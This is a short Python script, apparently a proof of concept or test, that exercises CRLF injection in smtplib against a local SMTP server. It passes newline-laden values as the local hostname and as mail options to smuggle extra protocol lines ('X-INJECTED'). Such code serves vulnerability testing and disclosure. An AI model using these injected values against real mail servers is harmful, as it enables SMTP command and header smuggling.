import smtplib

server = smtplib.SMTP('localhost', 10001, "hi\nX-INJECTED") # localhostname CRLF injection
server.set_debuglevel(1)
server.sendmail("hi@me.com", "you@me.com", "wazzuuup\nlinetwo")
server.mail("hi@me.com",["X-OPTION\nX-INJECTED-1","X-OPTION2\nX-INJECTED-2"]) # options CRLF injection
